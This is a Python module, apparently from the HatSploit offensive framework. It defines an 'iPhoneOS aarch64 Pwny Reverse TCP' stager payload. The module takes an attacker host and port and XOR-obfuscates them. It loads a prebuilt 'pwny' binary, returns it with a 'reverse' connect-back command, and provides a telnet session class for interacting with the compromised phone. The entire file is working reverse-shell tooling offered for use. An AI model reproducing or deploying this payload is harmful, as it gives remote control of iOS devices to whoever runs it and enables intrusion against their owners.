#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.base.payload import Payload
from hatsploit.base.config import Config
from hatsploit.utils.string import StringTools
from hatsploit.utils.tcp import TCPClient

from hatsploit.base.session import Session
from hatsploit.utils.telnet import TelnetClient


class HatSploitSession(Session, TelnetClient):
    client = None

    details = {
        'Platform': "iphoneos",
        'Type': "pwny"
    }

    def open(self, client):
        self.client = self.open_telnet(client)

    def close(self):
        self.client.disconnect()

    def send_command(self, command, output=False, timeout=10):
        output = self.client.send_command(command + '\n', output, timeout)
        if output:
            output = output.replace('pwny > ', '')
        return output

    def interact(self):
        self.client.interact()


class HatSploitPayload(Payload, StringTools, TCPClient):
    config = Config()

    details = {
        'Category': "stager",
        'Name': "iPhoneOS aarch64 Pwny Reverse TCP",
        'Payload': "iphoneos/aarch64/pwny_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080)'
        ],
        'Description': "Pwny reverse TCP payload for iPhoneOS aarch64.",
        'Comments': [
            ''
        ],
        'Architecture': "aarch64",
        'Platform': "iphoneos",
        'Risk': "high",
        'Type': "reverse_tcp"
    }

    options = {
        'LHOST': {
            'Description': "Local host.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'LPORT': {
            'Description': "Local port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    def run(self):
        local_host, local_port = self.parse_options(self.options)

        local_host = self.xor_string(local_host)
        local_port = self.xor_string(local_port)

        self.output_process("Generating payload...")
        with open(f"{self.config.path_config['data_path']}pwny/iphoneos/aarch64/pwny", 'rb') as f:
            payload = f.read()

        return payload, f"reverse '{local_host}' '{local_port}'", HatSploitSession
